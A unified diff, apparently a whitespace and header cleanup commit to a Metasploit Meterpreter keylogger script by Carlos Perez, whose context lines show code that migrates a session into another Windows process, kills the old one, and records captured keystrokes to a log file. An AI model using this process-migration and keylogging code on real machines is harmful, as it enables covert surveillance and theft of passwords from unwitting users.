@@ -1,5 +1,3 @@
-# $Id$
-# $Revision$
 # Author: Carlos Perez at carlos_perez[at]darkoperator.com
 # Updates by Shellster
 #-------------------------------------------------------------------------------
@@ -75,7 +73,7 @@ def explrmigrate(session,captype,lock,kill)
 			print_status("\t#{process2mig} Process found, migrating into #{x['pid']}")
 			session.core.migrate(x['pid'].to_i)
 			print_status("Migration Successful!!")
-			
+
 			if (kill)
 				begin
 					print_status("Killing old process")
@@ -149,7 +147,7 @@ def keycap(session, keytime, logfile)
 		rec = 1
 		#Creating DB for captured keystrokes
 		file_local_write(logfile,"")
-		
+
 		print_status("Keystrokes being saved in to #{logfile}")
 		#Inserting keystrokes every number of seconds specified
 		print_status("Recording ")
@@ -187,7 +185,7 @@ kill = false
 	when "-l"
 		lock = true
 	when "-k"
-		kill = true	
+		kill = true
 	end
 }
 if client.platform =~ /win32|win64/
